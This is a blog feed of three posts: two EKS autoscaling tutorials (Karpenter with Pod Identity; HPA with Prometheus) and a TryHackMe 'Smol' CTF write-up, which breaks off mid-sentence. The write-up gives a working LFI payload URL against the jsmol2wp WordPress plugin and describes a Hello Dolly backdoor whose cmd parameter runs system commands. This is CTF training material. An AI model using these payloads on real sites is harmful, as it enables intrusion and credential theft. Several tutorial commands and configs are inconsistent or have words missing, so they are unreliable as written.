item.title: Karpenter Node Autoscaling with Pod Identity in AWS
item.author: Ramksai
item.content:encoded: Kubernetes has become the standard for container orchestration, but managing compute resources efficiently remains a crucial challenge. Autoscaling plays a vital role in ensuring that workloads receive the right amount of compute power while keeping costs under control.Karpenter is an advanced node provisioning system that helps Kubernetes clusters scale nodes dynamically and efficiently. With the release of , it has become a stable and native solution for AWS, integrating tightly with AWS services like , which enhances security by managing IAM permissions at the pod level instead of relying on node-wide IAM roles.To fully understand Karpenter 1.0 with Pod Identity, let’s first explore the concept of , how it differs from , and what benefits it brings in terms of cost efficiency, optimal resource utilization, and scalability.What is Node Autoscaling?Node autoscaling is the process of automatically adjusting the number of worker nodes in a Kubernetes cluster based on resource demand. When workloads require more compute capacity, new nodes are provisioned, and when workloads scale down, underutilized nodes can be removed to save costs.How Node Autoscaling Works in KubernetesKubernetes supports node autoscaling primarily through two mechanisms: — The traditional way of scaling nodes using AWS Auto Scaling Groups (ASGs). It monitors pending pods and adjusts node count accordingly. — A more modern and efficient autoscaler that dynamically provisions nodes based on workload demands without relying on ASGs.Karpenter is designed to be and than the Cluster Autoscaler because it provisions nodes on demand, rather than relying on predefined node groups.Difference Between Pod Autoscaling and Node AutoscalingPod Autoscaling (HPA/VPA) is focused on adjusting the number of based on CPU/memory usage. It ensures application performance but doesn’t manage cluster capacity.Node Autoscaling (Karpenter/Cluster Autoscaler) is focused on adjusting the number of to accommodate the pod demand.While both are crucial, Karpenter provides more intelligent node autoscaling with real-time provisioning of the right node type, leading to better resource optimization.What We Can Achieve with Karpenter?Karpenter helps save costs by:Launching instead of predefined fixed-size nodes. onto fewer nodes during low demand.Scaling down unused nodes dynamically. for cost savings when workloads allow.2. Improved Resource UtilizationTraditional ASG-based scaling often leads to overprovisioning, resulting in idle resources.Karpenter ensures of workloads onto fewer nodes, minimizing wastage.3. Faster Scaling and Response to Workloads relies on ASGs and can be slow to scale.Karpenter provisions nodes instantly as soon as there is pod demand, ensuring faster response times.4. Right Cluster Resources for WorkloadsKarpenter can automatically select instance types that best match workload requirements (CPU, memory, GPU).Instead of relying on a static set of node types, it based on real-time needs.5. Native AWS IntegrationKarpenter works seamlessly with AWS services like EC2, EBS, Spot Instances, and IAM roles.Unlike Cluster Autoscaler, which depends on ASGs, Karpenter directly provisions EC2 instances via the AWS API.It supports AWS Nitro-based instances for improved security and performance.Setting Up Karpenter 1.0 with Pod IdentityOne of the major improvements in is its ability to integrate with instead of traditional node IAM roles.Why Use Pod Identity with Karpenter?Traditional node-based IAM roles grant permissions to the entire node, exposing all pods to those privileges.With , permissions are granted only to the specific pod running Karpenter, following the least privilege principle.Better Management of IAM Permissions:No need to create large IAM roles for EC2 instances.IAM policies are bound directly to the Karpenter pod, reducing security risks.:Works natively with AWS IAM Roles for Service Accounts (IRSA).Karpenter dynamically provisions nodes with the required IAM roles.Installation Steps Karpenter with Pod Identity?The installation process involves: Pod Identity works with Amazon EKS Cluster (version 1.25 and above)Enable Pod Identity Agent in EKS ClusterCreating an AWS IAM Role for Karpenter with Pod IdentityInstalling Karpenter in the EKS ClusterConfiguring Node ProvisionersTesting Autoscaling with WorkloadsStep 1: Enable AWS Pod Identity Agent Add-onAWS allows Kubernetes workloads to assume IAM roles securely without relying on instance-level IAM roles. This is essential for running with fine-grained access control.1.1 Check Available Add-ons for EKS 1.31Before enabling , confirm if the add-on is available for your cluster:aws eks describe-addon-versions --addon-name aws-pod-identity-agent1.2 Install the Pod Identity Agent Add-onRun the following command to enable the add-on in your cluster:aws eks create-addon --cluster-name CLUSTER-NAME\ --addon-name aws-pod-identity-agent \Replace ClUSTER-NAME with your actual EKS cluster name and update the AWS accordingly.We can also enable PodIdentity in AWS Console. . Open AWS Console → Navigate to Amazon EKS. . Select your EKS 1.31 Cluster from the list. . Click on the Add-ons tab. . Click “Get more add-ons”. . Search for AWS Pod Identity Agent. . Click Install and select the appropriate version. . Confirm the installation and wait for it to complete.1.3 Verify Add-on InstallationOnce installed, verify that the add-on is active:aws eks describe-addon --cluster-name eks-cluster-1-31 --addon-name aws-pod-identity-agentIf successful, you should see in the output. You can verify that the EKS Pod Identity Agent pods are running in your cluster using the following kubectl command:kubectl get pods -n kube-system | grep 'eks-pod-identity-agent'Expected output should show running pods similar to:aws-pod-identity-agent-xyz12 1/1 Running 0 2maws-pod-identity-agent-abc34 1/1 Running 0 2mIf the pods are not running, check logs for troubleshooting:kubectl logs -n kube-system -l app.kubernetes.io/name=aws-pod-identity-agentStep 2: Creating the Necessary IAM Roles with CloudFormationTo enable Karpenter to provision and manage EC2 instances within your EKS cluster, you’ll need to create specific IAM roles. CloudFormation provides a streamlined method for this process.Download the CloudFormation Template: Obtain the CloudFormation template from the official Karpenter documentation. This template defines the necessary IAM roles and policies.curl -fsSL https://karpenter.sh/v0.32.1/getting-started/getting-started-with-karpenter/cloudformation.yaml > karpenter-config-file.yaml2. Create the CloudFormation Stack: Use the AWS CLI to deploy the CloudFormation template. This will create the IAM roles required for Karpenter to function correctly.aws cloudformation create-stack \ --stack-name Karpenter-${CLUSTER_NAME} \ --template-body file://karpenter-cf.yaml \ --capabilities CAPABILITY_NAMED_IAM \ ParameterKey=ClusterName,ParameterValue=${CLUSTER_NAME} \ ParameterKey=ControllerRegion,ParameterValue=${AWS_REGION}--stack-name: Provides a unique name for your CloudFormation stack (e.g., Karpenter-my-eks-cluster).--template-body: Specifies the path to the downloaded CloudFormation template file.--capabilities CAPABILITY_NAMED_IAM: Acknowledges that the CloudFormation template will create IAM resources. This is a required parameter.--parameters: Allows you to override parameters defined in the CloudFormation template. In this case, you're specifying your EKS cluster name (ClusterName) and AWS region (ControllerRegion).The CloudFormation template will generate the following key components:KarpenterNodeRole: This IAM role is assigned to the EC2 instances that Karpenter provisions. It grants these instances the necessary permissions to join the EKS cluster, pull container images, and perform other essential tasks. This role includes managed policies such as:AmazonEKS_CNI_Policy: Allows the nodes to participate in the EKS networking.AmazonEKSWorkerNodePolicy: Grants basic worker node permissions for interacting with the EKS control plane.AmazonEC2ContainerRegistryReadOnly: Provides read-only access to Amazon ECR for pulling container images.AmazonSSMManagedInstanceCore: Enables SSM Agent for management via Systems Manager.KarpenterControllerPolicy: This IAM policy defines the permissions for the Karpenter controller itself. It allows the controller to manage EC2 instances, IAM roles, and other AWS resources required for autoscaling.KarpenterControllerRole: This IAM role is assumed by the Karpenter controller pod running in your cluster. It’s linked to the KarpenterControllerPolicy, granting the controller the necessary permissions. The trust relationship on this role is configured to allow the Karpenter service account to assume it.Step 3: Installing Karpenter in the EKS ClusterTo install Karpenter in your EKS cluster using Helm, follow these steps:Add the Karpenter Helm repository:helm repo add karpenter https://charts.karpenter.shhelm repo updateInstall Karpenter using the following Helm command:helm upgrade --install karpenter oci://public.ecr.aws/karpenter/karpenter \ --version "${KARPENTER_VERSION}" \ --create-namespace \ --set "settings.clusterName=${CLUSTER_NAME}" \ --set "settings.interruptionQueue=${CLUSTER_NAME}" \ --set controller.resources.requests.cpu=1 \ --set controller.resources.requests.memory=1Gi \ --set controller.resources.limits.cpu=1 \ --set controller.resources.limits.memory=1Gi \Installs Karpenter in the “karpenter” namespaceSets the cluster name and interruption queueConfigures resource requests and limits for the Karpenter controllerWaits for the installation to complete before proceedingkubectl get pods -n karpenterNAME READY STATUS RESTARTS AGEkarpenter-rgn746480-fdqtd 1/1 Running 0 4h47mkarpenter-rgn746480-fbgdd 1/1 Running 0 4h47mYou should see Karpenter pods running in the output.Check the Karpenter deployment:kubectl get deployment -n karpenterNAME READY UP-TO-DATE AVAILABLE AGEkarpenter 2/2 2 2 2dEnsure the deployment is available and ready.Step 4: Configuring Node ProvisionersTo configure the Node Provisioners. Karpenter will relay on two components.In Kubernetes, a node pool is a collection of nodes that share the same configuration, including instance type, availability zone, and other settings. In Karpenter, node pools are a way to define the characteristics and configurations of the worker nodes it provisions. Karpenter’s node pool functionality is closely tied to the EC2NodeClass resource, which defines the configuration for EC2 instances that Karpenter provisions on-demand to meet the needs of Kubernetes workloads.Karpenter leverages the resource to manage node pools. This resource defines the EC2 instances’ characteristics, such as instance type, subnets, and security groups, as well as other configurations like spot instances for cost savings. The EC2NodeClass allows Karpenter to automatically create and manage EC2 instances without the need for static node groups or Auto Scaling Groups (ASGs). Instead, Karpenter makes real-time decisions to provision nodes based on workload demands.4.1 Configuring Karpenter in the EKS ClusterYou can configure Karpenter to provision EC2 instances using below 2 methods. (by tagging subnets and security groups) (by defining subnets and SGs directly in the EC2NodeClass)Lets discuss more about these two methods and where it can be used.Method 1: Tagging Subnets and Security Groups (for a Single Cluster)In this method, we tag the subnets and security groups to allow Karpenter to discover and use the appropriate resources. This method is ideal when each subnet and SG is only used by a single cluster.: Set the environment variables for your cluster name, AWS account ID, and AWS region.CLUSTER_NAME="cluster-name-here" AWS_ACCOUNT_ID="aws-account-id-here" AWS_REGION="aws-region-here": You will need to tag your subnets with the Karpenter discovery tag. This step allows Karpenter to identify and use those subnets for provisioning instances.aws ec2 create-tags --resources ${SUBNET_ID} --tags Key=karpenter.sh/discovery,Value=${CLUSTER_NAME} --region ${AWS_REGION}Replace ${SUBNET_ID} with the actual subnet ID.The karpenter.sh/discovery tag helps Karpenter discover the subnet and associate it with the cluster.: Similarly, tag your security groups with the discovery tag to let Karpenter know which security group to use when provisioning nodes.aws ec2 create-tags --resources ${SG_ID} --tags Key=karpenter.sh/discovery,Value=${CLUSTER_NAME} --region ${AWS_REGION}Replace ${SG_ID} with the security group ID.4. Cluster-Specific Configuration: Now that the subnets and security groups are tagged, Karpenter can automatically discover these resources for use in provisioning EC2 instances for the specific cluster.: Use this method if your subnets and security groups are . This ensures proper discovery by Karpenter without needing to define resources in the .Method 2: Defining Subnets and Security Groups in EC2NodeClass (for Multiple Clusters)In this method, you define the subnets and security groups directly in the configuration for the cluster(s). This is the preferred method when the same subnets and security groups are used by . for each cluster: Define an EC2NodeClass configuration for each cluster. You will explicitly define the subnets and security groups in the configuration to avoid relying on tags.apiVersion: karpenter.sh/v1alpha5kind: EC2NodeClass name: cluster1-nodeclass instanceType: m5.large - subnet-0123456789abcdef # Subnet 1 - subnet-012dddkkdkkkcdef # Subnet 2 - subnet-01djkdkkk9abcdef # Subnet 3 - sg-0123456789abcdef # Security Group 1Replace subnet1,2,3 with your actual subnet ID.Replace sg-0123456789abcdef with your actual security group ID.2. Repeat for Other Clusters: For each cluster (Cluster 2, Cluster 3, etc.), repeat the EC2NodeClass definition with the same subnets and security groups, as shown below:apiVersion: karpenter.sh/v1alpha5kind: EC2NodeClass name: cluster2-nodeclass instanceType: m5.large - subnet-0123456789abcdef # Subnet 1 - subnet-012dddkkdkkkcdef # Subnet 2 - subnet-01djkdkkk9abcdef # Subnet 3 - sg-0123456789abcdef # Security Group 13. Karpenter Configuration: Karpenter will use the EC2NodeClass resource to discover and provision instances based on the subnets and security groups defined in each configuration. Since all clusters are using the same subnets and security groups, you don’t need to rely on tagging for resource discovery.: This method is ideal when (Cluster 1 to Cluster 5) share the same subnets and security groups. By directly defining these resources in the , you ensure that each cluster has the correct configuration for provisioning instances without any overlap or reliance on tagging.Let’s continue to setup EC2NodeClass & NodePools. Sorry for the long explanation :)Here I am taking Method2: Setting Up EC2NodeClass and NodePools in KarpenterapiVersion: karpenter.k8s.aws/v1kind: EC2NodeClass name: default-nodeclass amiFamily: AL2 # Amazon Linux 2 - id: subnet-0a12b345c67d890f1 # Subnet 1 ID - id: subnet-0b23c456d78e901g2 # Subnet 2 ID - id: subnet-0c34d567e89f012h3 # Subnet 3 ID securityGroupSelectorTerms: - tags: karpenter.sh/discovery: default-cluster - tags: Purpose: main-EKS-SG-Karpenter-nodes # Your custom security group tag role: KarpenterNodeRole-${CLUSTER_NAME} # IAM role for EC2 instancesamiFamily: Specifies the AMI family, which is set to in this case.subnetSelectorTerms: This specifies the three subnets where the Karpenter node instances will be provisioned. Replace these IDs with your actual subnet IDs.securityGroupSelectorTerms: This specifies the security group that should be applied to the instances. The Purpose tag identifies the security group.role: The IAM role that Karpenter will assume to manage EC2 instances.After writing the configuration for the EC2NodeClass, apply it to your cluster:kubectl apply -f ec2-nodeclass.yamlec2nodeclass.karpenter.k8s.aws/default-nodeclass createdVerify EC2NodeClass Creationkubectl get ec2nodeclassNAME AGEdefault-nodeclass 5mNow that we have the created, we can proceed to define the that references this EC2NodeClass. The NodePool will define the resource requirements and scale parameters.Here’s an example configuration for a that uses the EC2NodeClass and defines basic requirements, including instance family and availability zone selection.apiVersion: karpenter.sh/v1kind: NodePool name: default-nodepool template: labels: spec: name: default-nodeclass # Reference to the EC2NodeClass - key: "karpenter.k8s.aws/instance-family" values: ["m5", "t3"] - key: "topology.kubernetes.io/zone" operator: In values: ["us-west-2a", "us-west-2b", "us-west-2c"] taints: - key: "karpenter.k8s.aws/critical" value: "true" effect: NoSchedule # Tainting the node to schedule only critical workloads limits: cpu: 1000 # Limit on CPU resources that can be requested disruption: consolidationPolicy: WhenEmptyOrUnderutilized consolidateAfter: 1m - nodes: 10% # Deprovision only 10% of nodes when underutilized # On Weekdays during business hours, don't do any deprovisioning. - schedule: "0 9 * * mon-fri" nodes: "2" # Do not deprovision more than 2 nodes during this time windownodeClassRef: References the previously created EC2NodeClass (with subnets and security groups).requirements: Specifies the instance families (e.g., m5, t3) and the availability zones (us-west-2a, us-west-2b, us-west-2c).limits: Defines a limit on the CPU resources the NodePool can request.consolidationPolicy: Specifies when Karpenter should consolidate nodes (i.e., remove nodes from the cluster). Here, it will consolidate when empty or underutilized.consolidateAfter: Consolidates nodes after the last node in the node pool is empty or underutilized.budgets: Controls how many nodes can be deprovisioned. The first budget allows deprovisioning of nodes in the pool. The second budget prevents deprovisioning more than during business hours on weekdays.The taint ensures that only can be scheduled on the nodes of this pool. It uses the NoSchedule effect, meaning non-critical workloads will not be scheduled on nodes with this taint.Apply the NodePool Configurationkubectl apply -f nodepool.yamlnodepool.karpenter.sh/default-nodepool createdThis will create the NodePool and allow Karpenter to manage node provisioning based on the defined configurations.Verify NodePools Creationkubectl get nodepoolNAME AGEdefault-nodepool 1mStep 5: Testing the SetupAfter the and are configured, it’s important to test whether Karpenter provisions nodes as expected.To check if nodes are being provisioned automatically by Karpenter, run:kubectl get nodesNAME STATUS ROLES AGE VERSIONip-192-168-0-15.us-west-2.compute.internal Ready <none> 10m v1.21.5ip-192-168-0-16.us-west-2.compute.internal Ready <none> 8m v1.21.5This will the nodes that Karpenter has provisioned. You should see new EC2 instances corresponding to your configuration, located in the specified subnets.Test Scaling with Resource-Heavy Pod:To test automatic scaling, you can create a pod that requires more CPU resources, which will trigger Karpenter to provision additional nodes.Example resource-heavy pod:apiVersion: apps/v1kind: ReplicaSet name: load-test-replicaset replicas: 1 # Scaling up the pod count to trigger more node provisioning matchLabels: template: labels: spec: - name: busybox command: ["sh", "-c", "while true; do echo hello; sleep 10; done"] requests: limits:kubectl apply -f stress-test-pod.yamlkubectl get pods -o wideNAME READY STATUS RESTARTS AGE IP NODE NOMINATED NODEload-test-replicaset 1/1 Running 0 1m 192.168.1.10 ip-192-168-0-15.us-west-2.compute.internal <none>8. When Karpenter provisions new nodes, you will see additional nodes being added to the cluster. To simulate this, you can create more resource-heavy pods or scale up the existing ones.Let’s simulate resource pressure by creating more podskubectl scale replicaset load-test-replicaset --replicas=5replicaset.apps/load-test-replicaset scaledIf everything is configured correctly, Karpenter will detect the resource demand and provision additional EC2 instances as needed.9. Observe the nodes, Nodes will spin upNAME READY STATUS RESTARTS AGE IP NODE NOMINATED NODEload-test-pod-1 1/1 Running 0 5m 192.168.1.11 ip-192-168-0-15.us-west-2.compute.internal <none>load-test-pod-2 1/1 Running 0 5m 192.168.1.12 ip-192-168-0-16.us-west-2.compute.internal <none>load-test-pod-3 1/1 Running 0 5m 192.168.1.13 ip-192-168-0-17.us-west-2.compute.internal <none>load-test-pod-4 1/1 Running 0 5m 192.168.1.14 ip-192-168-0-17.us-4west-2.compute.internal <none>load-test-pod-5 1/1 Running 0 5m 192.168.1.15 ip-192-168-0-17.us-west-2.compute.internal <none>10. Verify Scaling in ActionTo see the scaling behavior more clearly, you can also describe the nodes and monitor the scaling activity.For example, describe the newly provisioned node to check its status and verify if the node is appropriately registered:kubectl describe node ip-192-168-0-17.us-west-2.compute.internalName: ip-192-168-0-17.us-west-2.compute.internalRoles: <none>Labels: karpenter.k8s.aws/instance-family=m5 topology.kubernetes.io/zone=us-west-2cTaints: karpenter.k8s.aws/critical=true:NoScheduleUnschedulable: false...The node is in the Ready state and has the applied. Karpenter will manage the node scaling based on resource needs.11. Once we scale down the replica count in the ReplicaSet to 1(or any desired value). This will reduce the demand for resources and trigger Karpenter to scale down the nodes if the pods are underutilized.Run the following command to scale down the ReplicaSet:kubectl scale replicaset load-test-replicaset --replicas=2replicaset.apps/load-test-replicaset scaled12. Verify Node DecommissioningAfter the scaling down process, check the list of nodes to ensure that the unneeded nodes have been removed from the cluster.Run the following command to verify the current list of nodes in your cluster:kubectl get nodesNAME STATUS ROLES AGE VERSIONip-192-168-0-17.us-west-2.compute.internal Ready <none> 10m v1.21.0ip-192-168-0-18.us-west-2.compute.internal Ready <none> 10m v1.21.0ip-192-168-0-19.us-west-2.compute.internal Ready <none> 10m v1.21.0ip-192-168-0-15.us-west-2.compute.internal Terminated <none> 10m v1.21.0 # This node has been deprovisionedip-192-168-0-16.us-west-2.compute.internal Terminated <none> 10m v1.21.0 # This node has been deprovisionedIn this example, you can see that the nodes ip-192-168-0-15 and ip-192-168-0-16 have been terminated after the scaling down operation.13. Verify Pod DistributionAfter the nodes are decommissioned, the remaining pods will be redistributed to the available nodes. You can verify the pod distribution by running the following command:kubectl get pods -o wideNAME READY STATUS RESTARTS AGE IP NODE NOMINATED NODEload-test-pod-1 1/1 Running 0 10m 192.168.1.11 ip-192-168-0-17.us-west-2.compute.internal <none>load-test-pod-2 1/1 Running 0 10m 192.168.1.12 ip-192-168-0-18.us-west-2.compute.internal <none>load-test-pod-3 1/1 Running 0 10m 192.168.1.13 ip-192-168-0-19.us-west-2.compute.internal <none>Step 5: Monitoring and DebuggingIf the node provisioning does not work as expected, you can: to diagnose issues:kubectl logs -n karpenter -l app=karpenter in the AWS Console to ensure they are being created in the correct subnets and security groups.

item.title: Understanding and Setting Up HPA with Metrics Server, Prometheus, and Prometheus Adapter in EKS
item.author: Ramksai
item.content:encoded: Kubernetes provides powerful scaling mechanisms to ensure applications can handle varying workloads efficiently. One of the key features is , which dynamically adjusts resources based on demand. There are two primary types of autoscaling in Kubernetes:: Ensures that the cluster itself can scale by adding or removing worker nodes. This is managed by tools like or in AWS EKS.: Adjusts the number of pods in a deployment based on CPU, memory, or custom metrics. This is done using Horizontal Pod Autoscaler (HPA) or Vertical Pod Autoscaler (VPA).Node-Based vs. Pod-Based AutoscalingNode-Based vs. Pod-Based Autoscaling in KubernetesKubernetes provides two primary scaling mechanisms: (scaling infrastructure by adding/removing nodes). (scaling application pods dynamically).Node-Based vs. Pod-Based Autoscaling in KubernetesKubernetes provides two primary scaling mechanisms: (scaling infrastructure by adding/removing nodes). (scaling application pods dynamically).1. Node-Based Autoscaling adjusts the number of worker nodes in a Kubernetes cluster based on resource demand.In AWS EKS, this is achieved using or Cluster Autoscaler (CA) with Auto Scaling Groups (ASGs).How Node Autoscaling Works in AWS?There are two primary ways to scale nodes in AWS EKS:1️⃣ Using Cluster Autoscaler (CA) with AWS Auto Scaling Groups (CA) monitors pending pods and requests new nodes from an when needed.Works well with EC2-based managed node groups in EKS.Scales nodes up when pods cannot be scheduled due to insufficient resources.Scales nodes down when nodes are underutilized.📌 Cluster Autoscaler Setup:2️⃣ Using Karpenter for Node Autoscaling is a newer and more flexible autoscaler that directly provisions nodes when required.It does not rely on Auto Scaling Groups and can provision instances dynamically.Works well with and in AWS.Faster and more efficient than Cluster Autoscaler in many cases.When to Use Node Autoscaling?✅ When workloads require additional compute capacity (new nodes).✅ When running or workloads with unpredictable demand.✅ When scaling Kubernetes clusters in cloud environments like AWS, GCP, and Azure. dynamically adjusts the number of pods in a deployment or StatefulSet based on workload demand.Managed using Horizontal Pod Autoscaler (HPA) and Vertical Pod Autoscaler (VPA).HPA (Horizontal Pod Autoscaler)Increases or decreases the based on resource utilization.Uses CPU, memory, or custom external metrics (Prometheus, CloudWatch, etc.) to scale workloads dynamically. — pods are added or removed while running.apiVersion: autoscaling/v2kind: HorizontalPodAutoscaler name: cpu-hpaspec: apiVersion: apps/v1 name: my-app maxReplicas: 10 - type: Resource name: cpu type: Utilization🔹 ✅ Best for stateless workloads like web applications, APIs, and microservices.✅ Ideal when traffic fluctuates throughout the day. by removing unused pods.VPA (Vertical Pod Autoscaler)Adjusts CPU and memory requests/limits for pods instead of scaling pod count.Can automatically increase pod resource allocations based on demand.Requires to apply new resource limits.apiVersion: autoscaling.k8s.io/v1kind: VerticalPodAutoscaler name: vpa-examplespec: apiVersion: "apps/v1" name: my-app updateMode: "Auto"🔹 ✅ Best for stateful applications like databases, Redis, and AI workloads.✅ Useful when pod resource consumption is and needs automatic adjustment.❌ Not recommended for web applications since it , causing downtime.Comparison: HPA vs. VPA vs. Node Autoscaler ✅ when you need for microservices, APIs, and web workloads. ✅ when your workload’s CPU and memory needs change dynamically, like databases and ML workloads. ✅ when your cluster runs out of nodes to schedule pods.🚀 👉 HPA for application scaling (with CPU, memory, and Prometheus metrics).👉 VPA for stateful workloads that need optimized resource allocation.👉 Karpenter or Cluster Autoscaler for infrastructure scaling in AWS.Understanding and Setting Up HPA in a Production-Like Kubernetes Cluster for EKS setup? 🎯 in our .A sample production application deployed in the namespace .The application starts with , but we want it to scale dynamically when traffic increases. Kubernetes Metrics Server/ Metric Adapter and Prometheus. for our application. to trigger autoscaling.Observe HPA scaling behavior as pods increase from .Step 1: Understanding the ComponentsBefore we begin, let’s define the key components: is a lightweight, scalable solution that collects CPU and memory usage from Kubernetes nodes and pods. It provides real-time metrics via the and is essential for Kubernetes Horizontal Pod Autoscaler (HPA) to function.Kubernetes pods without live resource utilization metrics.The default Kubernetes installation does NOT include a Metrics Server.Commands like kubectl top nodes and kubectl top pods rely on it.Metrics Server fetches CPU and memory usage from Kubelet on each node.It store metrics persistently (unlike Prometheus).The HPA queries Metrics Server for live resource metrics to decide if scaling is needed.kube-metrics-adapter bridges Prometheus metrics with Kubernetes' custom metrics API. It enables HPA to scale based on custom application metrics like:Metrics Server only provides CPU & memory metrics.HPA needs a way to use Prometheus metrics for scaling.kube-metrics-adapter converts Prometheus metrics into Kubernetes API-compatible custom metrics.The adapter for custom metrics.It under custom.metrics.k8s.io.HPA and adjusts pod replicas accordingly. is a powerful monitoring and alerting system that stores and queries time-series data, including custom application metrics. It acts as a for custom Kubernetes metrics.Metrics Server only provides CPU and memory metrics.To scale on (like request rate, queue length), we need Prometheus.It stores data for analysis and troubleshooting.Prometheus scrapes metrics from Kubernetes components and applications.It exposes these metrics via an HTTP API.The kube-metrics-adapter fetches Prometheus metrics and makes them available to HPA.Before setting up HPA, let’s first understand the role of Metrics Server, Prometheus, and Prometheus Adapter in autoscaling.Installing and Configuring Kubernetes Metrics Server, Kube Metrics Adapter, and PrometheusStep 1: Install Metrics Serverkubectl apply -f https://github.com/kubernetes-sigs/metrics-server/releases/latest/download/components.yamlkubectl get deployment metrics-server -n kube-systemkubectl get pods -n kube-system | grep metric-server✅ If metrics-server is running, the installation is successful!Step 2: Install Prometheus for Metrics Collectionusing Helmhelm repo add prometheus-community https://prometheus-community.github.io/helm-chartshelm repo updatehelm install prometheus prometheus-community/kube-prometheus-stack --namespace monitoring --create-namespaceVerify Prometheus Installationkubectl get pods -n monitoring | grep prometheus✅ If Prometheus pods are running, the installation is successful!Port-Forward Prometheus UIkubectl port-forward svc/prometheus-kube-prometheus-prometheus 9090 -n monitoringStep 3: Install Kube Metrics Adapterhelm install kube-metrics-adapter prometheus-community/prometheus-adapter -n monitoringVerify Kube Metrics Adapter Installationkubectl get pods -n monitoring | grep kube-metrics-adapter✅ If the adapter pod is running, it is correctly installed!Step 4: Configure Kube Metrics Adapter with Prometheus Host DetailsBy default, Kube Metrics Adapter connects to Prometheus using a service name inside the cluster. However, you can explicitly set the Prometheus host if needed.Identify Prometheus Service NameRun the following command to get the Prometheus service:kubectl get svc -n monitoringYou should see something like this:NAME TYPE CLUSTER-IP PORT(S) prometheus-kube-prometheus-prometheus ClusterIP 10.100.200.10 9090/TCPHere, the Prometheus service is:prometheus-kube-prometheus-prometheus.monitoring.svc.cluster.localvalues.yaml for Kube Metrics AdapterModify your values.yaml to explicitly define the Prometheus host:prometheus: url: "http://prometheus-kube-prometheus-prometheus.monitoring.svc.cluster.local:9090" path: "/"rules: default: true - seriesQuery: 'http_requests_total' overrides: namespace: {resource: "namespace"} pod: {resource: "pod"} matches: "^(.*)_total" metricsQuery: "rate(<<.Series>>[2m])"helm upgrade --install kube-metrics-adapter prometheus-community/prometheus-adapter -f values.yaml --namespace monitoringVerify Metrics Adapter ConnectionCheck if it is exposing metrics correctly:kubectl get --raw "/apis/custom.metrics.k8s.io/v1beta1"✅ If the output contains a list of metrics, it is successfully connected to Prometheus!How Does Kube Metrics Adapter Connect to Prometheus?By default, the kube-metrics-adapter queries Prometheus using its internal Kubernetes DNS name:--prometheus-server=https://prometheus.istio-system.svc.cluster.localWhy Use Internal DNS Instead of Route 53?✔ — Everything stays inside the cluster.✔ — Prometheus metrics are not exposed externally.✔ Automatic service discovery — Kubernetes resolves the service internally.When Should You Use Route 53 Instead?If your Prometheus instance is outside the cluster (e.g., AWS Managed Prometheus, another AWS VPC).In this case, configure the kube-metrics-adapter to use an external Route 53 DNS name:--prometheus-server=https://prometheus.mycompany.com🔹 If you already have a DNS entry (e.g., Route 53, internal VPC DNS), use that instead of the local Kubernetes service name.Step 5: Configure HPA to Use Custom MetricsExample: Create HPA Using HTTP Requests as a Custom Metric1️⃣ Deploy a Sample Applicationkubectl create deployment nginx --image=nginx --replicas=2kubectl expose deployment nginx --type=ClusterIP --port=802️⃣ Create HPA Resource (hpa.yaml)apiVersion: autoscaling/v2beta2kind: HorizontalPodAutoscaler name: nginx-hpaspec: apiVersion: apps/v1 name: nginx maxReplicas: 10 - type: External metric: name: http_requests_per_second target: averageValue: 100kubectl apply -f hpa.yaml5️⃣ Test Scaling by Sending TrafficUse a load testing tool like to generate HTTP traffic:hey -z 1m -c 50 http://nginx.default.svc.cluster.localAfter some time, check if the :✅ If the pod count increases, autoscaling is working!

item.title: Smol (CTF) — TryHackMe Writeup
item.author: z0diac
item.content:encoded: Smol (CTF) — TryHackMe WriteupTest your enumeration skills on this boot-to-root machine.In this Capture The Flag (CTF) walkthrough, we explore the challenge on TryHackMe. This challenge tests your enumeration and privilege escalation skills in a boot-to-root scenario. By leveraging techniques such as Local File Inclusion (LFI), exploiting backdoored WordPress plugins, cracking password hashes, and abusing misconfigured sudo privileges, we gain root access and capture the final flag.Start the machine and collect the “Target IP Address” to begin the scan.To get an overview of the open ports on the target system, perform an scan using the following command:sudo nmap -Pn -vv -T4 -n <ip>The scan detected and To get a full thorough scan, use this command:sudo nmap -A -vv -T4 -n <ip>From the scan results, port is running Apache HTTP Server 2.4.41 on Ubuntu, and accessing it redirects to http://www.smol.thm. This means we need to add www.smol.thm to /etc/hosts to resolve the domain properly.Then, I accessed the site again, and this time, it worked.Based on the website and its page source, it appears to be a WordPress-based website.Before performing , I conducted using :From the directory enumeration results, I found several key files and directories for further analysis.First we got some login page.Second, we noticed the presence of , but it is inaccessible from the browser. This is expected, as WordPress typically restricts direct access to this file since it contains database credentials and other critical configuration settings.Third, we found the plugin, which is known to have a backdoor according to this article. This could be a potential security risk if the plugin is outdated or modified.To further analyze vulnerabilities, I proceeded with .Executing the following command:During the scan, I discovered that this WordPress site is using the plugin, specifically version , which is outdated and vulnerable.According to a GitHub report, this plugin contains two critical security vulnerabilities. One of them is an Arbitrary File Read & Server-Side Request Forgery (SSRF) (CVE-2018–20463). The vulnerability exists in the file located at /wp-content/plugins/jsmol2wp/php/jsmol.phpThe issue arises because the $query parameter in the file_get_contents() function is directly controllable by an attacker. This allows unauthorized access to arbitrary files on the server using , a technique commonly used in Local File Inclusion (LFI) attacks. By exploiting this, an attacker could retrieve sensitive files such as , which contains database credentials and other critical configuration settings.Using the PoC, I crafted the following payload to exploit LFI:http://www.smol.thm/wp-content/plugins/jsmol2wp/php/jsmol.php?isform=true&call=getRawDataFromDatabase&query=php://filter/resource=../../../../wp-config.phpAs you can see, we’re inside the “”.This successfully retrieved the file, revealing:: wpuserDatabase password: [REDACTED]Using these credentials, I logged into wp-login.php successfully.Upon inspecting the section, I found a private page titled “Webmaster Tasks!!” created by the . This confirmed my earlier suspicion that the Hello Dolly plugin contains a backdoor.This confirmed my earlier suspicion that the Hello Dolly plugin contains a backdoor.I read an article about the Hello Dolly backdoor and discovered that its source is located in /wp-content/plugins/hello.php. My idea is to leverage LFI to open the file.To confirm, I leveraged to access hello.php:http://www.smol.thm/wp-content/plugins/jsmol2wp/php/jsmol.php?isform=true&call=getRawDataFromDatabase&query=php://filter/resource=../../../../wp-content/plugins/hello.phpAs you can see, there’s a hidden backdoor that allows an attacker to execute arbitrary system commands. The most suspicious part is the eval(base64_decode(...)) statement, which decodes and executes a Base64-encoded string.To disguise the backdoor, the function includes seemingly harmless code that fetches and displays a lyric from the “Hello Dolly” song. This makes it look like a normal WordPress function, helping it evade detection.Then i copy the base64 encoded text and decode it. When decoded, the payload reveals that it checks for a GET parameter named cmd and executes its value using the system() function. This means an attacker can remotely execute system commands by visiting a URL such as http://www.smol.com/x.php?cmd=whoami, effectively gaining command-line access to the server.Because the lyrics were exposed on the /wp-admin page, I then executed the command on 